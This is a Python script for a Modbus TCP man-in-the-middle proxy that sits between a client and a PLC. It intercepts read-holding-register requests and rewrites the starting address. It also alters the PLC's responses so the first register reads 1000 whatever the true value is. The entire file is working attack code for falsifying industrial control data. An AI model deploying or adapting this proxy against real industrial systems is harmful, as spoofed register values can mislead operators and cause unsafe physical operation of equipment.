import socket
import threading

# Proxy settings
PROXY_HOST = '0.0.0.0'   # The address to bind the proxy on
PROXY_PORT = 5020          # The port to expose for Modbus traffic (standard Modbus TCP port is 502)
MODBUS_SERVER_HOST = '127.0.0.1'  # Address of the real Modbus server (PLC)
MODBUS_SERVER_PORT = 502    # Port of the real Modbus server

BUFFER_SIZE = 1024  # Buffer size for receiving data

def manipulate_request(data):
    """
    Intercept and modify the Modbus request as needed.
    Example: Intercept a read holding register request (Function code 0x03) and modify the address.
    """
    print("[*] Original Modbus Request: ", data)
    
    # Simple Example: If it's a read holding register (function code 0x03)
    if data[7] == 0x03:  # Function code is at the 8th byte in Modbus TCP
       print("[*] Intercepted Read Holding Registers Request")
       # Optionally modify the starting register or number of registers
       # Example: Change starting register to 0x0002 (original was 0x0000)
       manipulated_data = bytearray(data)
       manipulated_data[8] = 0x00  # Change starting register address
       manipulated_data[9] = 0x02  # Continue modifying if needed
       print("[*] Manipulated Modbus Request: ", manipulated_data)
       return bytes(manipulated_data)
    
    return data

def manipulate_response(data):
    """
    Intercept and modify the Modbus response as needed.
    Example: Change a value in the response.
    """
    print("[*] Original Modbus Response: ", data)
    
    # Example: If it's a response to a read holding register request (function code 0x03)
    if data[7] == 0x03:  # Function code 0x03 (response)
       print("[*] Intercepted Read Holding Registers Response")
       # Modify the register values in the response
       # Example: Change the first register value to 1000 (0x03E8)
       manipulated_data = bytearray(data)
       manipulated_data[9] = 0x03  # High byte of 1000
       manipulated_data[10] = 0xE8  # Low byte of 1000
       print("[*] Manipulated Modbus Response: ", manipulated_data)
       return bytes(manipulated_data)
        
    return data

def handle_modbus_client(client_socket):
    """
    Handle communication with the Modbus client.
    """
    # Connect to the real Modbus server
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect((MODBUS_SERVER_HOST, MODBUS_SERVER_PORT))
    print(f"[*] Modbus Proxy connected to real Modbus server")

    try:
        while True:
            # Receive Modbus request from client
            client_request = client_socket.recv(BUFFER_SIZE)
            if not client_request:
                break
            
            # Optionally manipulate the request before sending it to the real server
            manipulated_request = manipulate_request(client_request)
            
            # Forward the request to the real Modbus server
            server_socket.send(manipulated_request)
            
            # Receive the response from the real Modbus server
            server_response = server_socket.recv(BUFFER_SIZE)
            
            # Optionally manipulate the response before sending it back to the client
            manipulated_response = manipulate_response(server_response)
            
            # Send the manipulated response back to the client
            client_socket.send(manipulated_response)
    
    except Exception as e:
        print(f"[!] Error handling Modbus communication: {e}")
    
    finally:
        client_socket.close()
        server_socket.close()

def start_modbus_proxy():
    """
    Start the Modbus TCP proxy that listens for incoming Modbus clients.
    """
    proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    proxy_socket.bind((PROXY_HOST, PROXY_PORT))
    proxy_socket.listen(5)
    print(f"[*] Modbus Proxy listening on {PROXY_HOST}:{PROXY_PORT}")

    while True:
        # Accept incoming connection from Modbus client
        client_socket, addr = proxy_socket.accept()
        print(f"[*] Accepted connection from {addr}")

        # Handle the client in a new thread
        client_thread = threading.Thread(target=handle_modbus_client, args=(client_socket,))
        client_thread.start()

if __name__ == "__main__":
    start_modbus_proxy()

